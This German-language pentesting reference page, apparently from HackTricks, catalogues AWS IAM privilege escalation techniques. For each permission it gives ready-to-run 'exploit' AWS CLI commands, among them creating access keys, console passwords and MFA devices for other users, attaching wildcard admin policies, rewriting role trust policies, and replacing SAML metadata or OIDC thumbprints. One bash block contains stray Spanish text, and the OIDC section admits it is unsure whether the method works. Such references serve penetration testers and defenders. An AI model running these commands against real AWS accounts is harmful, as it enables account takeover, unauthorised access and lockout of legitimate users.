# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Für weitere Informationen zu IAM siehe:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Ermöglicht das Erstellen einer neuen IAM-Policy-Version und umgeht dabei die Notwendigkeit der Berechtigung `iam:SetDefaultPolicyVersion`, indem das Flag `--set-as-default` verwendet wird. Dadurch können benutzerdefinierte Berechtigungen definiert werden.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Auswirkung:** Eskaliert Privilegien direkt, indem beliebige Aktionen für beliebige Ressourcen erlaubt werden.

### **`iam:SetDefaultPolicyVersion`**

Ermöglicht das Ändern der Standardversion einer IAM policy auf eine andere vorhandene Version und kann zu einer Eskalation von Berechtigungen führen, wenn die neue Version mehr Berechtigungen gewährt.

**Bash Command:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Auswirkung:** Indirekte Privilegieneskalation durch das Ermöglichen zusätzlicher Berechtigungen.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Ermöglicht das Erstellen einer Access Key ID und eines Secret Access Key für einen anderen Benutzer, was zu einer möglichen Privilegieneskalation führen kann.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Impact:** Direkte Privilegieneskalation durch die Übernahme der erweiterten Berechtigungen eines anderen Benutzers.

Beachten Sie, dass für einen Benutzer maximal 2 access keys erstellt werden können. Wenn ein Benutzer bereits 2 access keys hat, benötigen Sie die Berechtigung `iam:DeleteAccessKey`, um einen davon zu löschen und einen neuen zu erstellen:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

Wenn du ein neues virtuelles MFA-Gerät erstellen und es bei einem anderen Benutzer aktivieren kannst, kannst du effektiv dein eigenes MFA für diesen Benutzer einrichten und dann eine MFA-gestützte Sitzung für dessen Anmeldedaten anfordern.

**Exploit:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Auswirkung:** Direkte Privilegieneskalation durch Übernahme der MFA-Registrierung eines Benutzers (und anschließende Nutzung seiner Berechtigungen).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Erlaubt das Erstellen oder Aktualisieren eines Login-Profils, einschließlich des Setzens von Passwörtern für die AWS Console-Anmeldung, was zu direkter Privilegieneskalation führt.

**Exploit zur Erstellung:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit für Update:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Auswirkung:** Direkte Privilegieneskalation durch Anmeldung als "beliebiger" Benutzer.

### **`iam:UpdateAccessKey`**

Ermöglicht das Aktivieren eines deaktivierten access key, was möglicherweise zu unautorisiertem Zugriff führen kann, wenn der Angreifer den deaktivierten Key besitzt.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Auswirkung:** Direkte Privilegieneskalation durch Reaktivierung von Zugangsschlüsseln.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Ermöglicht das Erstellen oder Zurücksetzen von Anmeldeinformationen für bestimmte AWS-Services (z. B. CodeCommit, Amazon Keyspaces), wobei die Berechtigungen des zugehörigen Benutzers übernommen werden.

**Exploit for Creation:**
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
**Exploit zum Zurücksetzen:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Auswirkung:** Direkte privilege escalation innerhalb der Service-Berechtigungen des Benutzers.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Ermöglicht das Anhängen von Policies an Benutzer oder Gruppen, was zu einer direkten privilege escalation führt, da die Berechtigungen der angehängten Policy übernommen werden.

**Exploit für Benutzer:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit für Gruppe:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Auswirkung:** Direkte Privilegieneskalation auf alles, was die Richtlinie gewährt.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Ermöglicht das Anhängen oder Hinzufügen von Richtlinien an Rollen, Benutzer oder Gruppen und erlaubt so eine direkte Privilegieneskalation durch Gewährung zusätzlicher Berechtigungen.

**Exploit für Rolle:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Exploit für Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Du kannst eine Richtlinie wie diese verwenden:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Auswirkung:** Direkte Privilegieneskalation durch Hinzufügen von Berechtigungen über Richtlinien.

### **`iam:AddUserToGroup`**

Ermöglicht, sich selbst zu einer IAM-Gruppe hinzuzufügen und dadurch Privilegien zu eskalieren, indem man die Berechtigungen der Gruppe übernimmt.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Impact:** Direkte Privilegieneskalation auf das Niveau der Berechtigungen der Gruppe.

### **`iam:UpdateAssumeRolePolicy`**

Ermöglicht die Änderung des AssumeRole-Policy-Dokuments einer Rolle, wodurch das Annehmen der Rolle und ihrer zugehörigen Berechtigungen ermöglicht wird.

**Exploit:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Wenn die Richtlinie wie folgt aussieht, die dem Benutzer die Berechtigung gibt, die Rolle anzunehmen:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impact:** Direkte Privilegieneskalation durch das Annehmen der Berechtigungen beliebiger Rollen.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Ermöglicht das Hochladen eines SSH-Public-Keys zur Authentifizierung bei CodeCommit und das Deaktivieren von MFA-Geräten, was zu einer möglichen indirekten Privilegieneskalation führen kann.

**Exploit for SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit für MFA Deaktivierung:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Auswirkung:** Indirekte Privilegieneskalation durch Aktivierung des CodeCommit-Zugriffs oder Deaktivierung des MFA-Schutzes.

### **`iam:ResyncMFADevice`**

Ermöglicht die Resynchronisation eines MFA-Geräts, was potenziell zu einer indirekten Privilegieneskalation führen kann, indem der MFA-Schutz manipuliert wird.

**Bash-Befehl:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impact:** Indirekte Privilegieneskalation durch Hinzufügen oder Manipulieren von MFA-Geräten.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Mit diesen Berechtigungen können Sie die **XML-Metadaten der SAML-Verbindung ändern**. Anschließend könnten Sie die **SAML federation** missbrauchen, um sich mit jeder **role**, die ihr vertraut, einzuloggen.

Beachten Sie, dass dadurch **legitime Benutzer sich nicht einloggen können**. Sie können jedoch die XML erhalten, Ihre eigene einsetzen, sich einloggen und die vorherige Konfiguration wiederherstellen.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
> [!NOTE]
> TODO: Ein Tool, das SAML-Metadaten erzeugen und sich mit einer angegebenen Rolle anmelden kann
### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Unsicher, ob das zutrifft) Wenn ein Angreifer diese **Berechtigungen** hat, könnte er einen neuen **Thumbprint** hinzufügen, um sich in allen Rollen anmelden zu können, die dem Provider vertrauen.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Diese Berechtigung erlaubt einem Angreifer, die permissions boundary eines Benutzers zu aktualisieren und dadurch möglicherweise seine Privilegien zu eskalieren, indem er Aktionen ausführt, die normalerweise durch seine bestehenden Berechtigungen eingeschränkt sind.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

Ein Akteur mit iam:PutRolePermissionsBoundary kann eine Permissions Boundary für eine vorhandene Rolle setzen. Das Risiko entsteht, wenn jemand mit dieser Berechtigung die Boundary einer Rolle ändert: er kann Operationen unangemessen einschränken (was zu Dienstunterbrechungen führen kann) oder, wenn er eine zu großzügige Boundary anbringt, effektiv die Möglichkeiten der Rolle erweitern und somit Privilegien eskalieren.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Referenzen

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
